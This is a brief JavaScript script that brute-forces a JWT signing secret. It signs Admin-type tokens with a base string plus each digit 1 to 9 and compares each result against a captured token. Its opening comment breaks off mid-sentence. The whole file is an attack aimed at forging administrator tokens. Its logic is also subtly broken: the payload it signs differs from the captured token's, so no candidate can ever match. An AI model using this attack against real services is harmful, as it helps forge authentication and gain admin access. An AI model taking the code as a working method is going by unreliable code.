// Author: Ritchie Yapp
// https://github.com/speckly

// Attackers can use their own token to guess the 

var jwt = require('jsonwebtoken');

guess = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOjY2LCJ0eXBlIjoiQWRtaW4iLCJpYXQiOjE3MDY1MDI3MjEsImV4cCI6MTcwNjU4OTEyMX0.DI1LS9E4M9ldBkaC2uaesZpY59UKO4hga8sKnYzb2g8"

base_guess = "89f48478ofu84hfue8o8eije",

[1,2,3,4,5,6,7,8,9].forEach((number) => {
    attacker_guess = base_guess + number
    token = jwt.sign({
        userid: 'user',
        type: 'Admin',
    }, attacker_guess, {
        expiresIn: 86400 // Expires in 24 hours
    });
    if (guess == token) {
        console.log("Found the correct secret key: " + attacker_guess)
    } else {
        console.log(token)
    }
})

